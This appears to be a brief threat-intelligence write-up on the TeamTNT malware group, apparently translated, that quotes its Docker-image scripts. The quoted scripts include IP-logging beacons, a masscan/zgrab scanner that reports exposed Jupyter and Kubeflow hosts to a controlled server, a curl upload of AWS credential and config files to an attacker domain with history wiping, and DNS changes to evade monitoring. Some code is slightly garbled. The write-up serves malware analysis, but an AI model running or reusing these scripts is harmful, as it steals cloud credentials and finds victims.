# TeamTNT

## Features

1. When constructing a malicious Docker image, TNTfeatB0rg will be used to steal AWS credentials. Part of the malicious software code is embedded into the system function call through Base64 encoding.

2. Also used in Docker image https://iplogger.org/ Web service to record the IP address of the victim's host, and then record it through the self-hosted address.

```bash
#!/bin/bash
curl -Lk https://iplogger.org/[Personal address] -o /dev/null
sleep 3
curl -Lk https://IP//SATW/ip.php -o /dev/null

```

This Docker image also contains a tornado.sh script, which uses Masscan and Zgarb tools to detect the target IP address range and the provided port. If it matches"Home Page - Select or create a notebook"、"Kubeflow Central Dashboard"、"Jupyter Lab"、"JupyterLab"Keyword will filter out its matching IP address information through jq, and then send it to the controlled host.

```bash
rndstr=$(head /dev/urandom | tr -dc a-z | head -c 6 ; echo '')
//Add the matching IP address to the rndstr array
if [ "$T_PORT" =  "8888" ]; then
eval "$rndstr"="'$(masscan $T_RANGE -p$T_PORT --rate=$S_RATE | awk '{print $6}' | zgrab --senders 200 --port $T_PORT --http='/tree' --output-file=- 2>/dev/null | grep -E "Home Page - Select or create a notebook/Kubeflow Central Dashboard|Jupyter Lab|JupyterLab' l jg-r .ip)'"
//Send request to web address /tree path
else
eval "$rndstr"="'$(masscan $T_RANGE -p$T_PORT --rate=$S_RATE | awk '{print $6}' | zgrab --senders 200 --port $T_PORT --http='/' --output-file=- 2>/dev/null | grep -E "Home Page - Select or create a notebook/Kubeflow Central Dashboard|Jupyter Lab|JupyterLab' l jg-r .ip)'"
//Send a request to the web root path
fi

for IP_ADDR in ${!rndstr}
do

if [ "$T_PORT" = "443" ]; then
TARGET="https://"$IP_ADDR
else
TARGET="http://"$IP_ADDR:$T_PORT
fi
echo '##################################################'
curl -sLk http://IP/SATW/res.php?vuln=$TARGET -o /dev/null
//Send data to controllable host
echo $TARGET
done;
}
```

3. The worm will steal AWS's credential file through several lines of code ~/.aws/credentials and configuration file ~/.aws/config.

```bash
if [ -f /root/.aws/credentials ]; then
echo "FOUND : /root/.aws/credentials"
curl -F "userfile=@/root/.aws/credentials" http://domain/thx/for/your/key/index.php
//Send AWS credentials to the attacker's server
curl -F "userfile=@/root/.aws/config" http://domain/thx/for/your/key/index.php
//Send AWS configuration file to attacker server
history -c
fi

if [ -f /home/*/.aws/credentials ]; then
echo "FOUND : /home/*/.aws/credentials"
curl -F "userfile=@/home/jovyan/.aws/credentials" http://domain/thx/for/your/key/index.php
curl -F "userfile=@/home/jovyan/.aws/config" http://domain/thx/forlyour/key/index.php
history -c
fi

rm -f $0
```

4. Hildegard malware uses the IRC proxy built by the open source project Ziggystartux, and then modifies the system DNS resolution to Google's DNS server to avoid being detected by the DNS monitoring tool.

```bash
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.4.4' 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.4.4' >> /etc/resolv.conf
//Modify DNS resolution to 8.8.4.4
cat /etc/resolv.conf 2>/dev/null | grep 'nameserver 8.8.8.8' 2>/dev/null 1>/dev/null || echo 'nameserver 8.8.8.8' >> /etc/resolv.conf
//Modify DNS resolution to 8.8.8.8
```
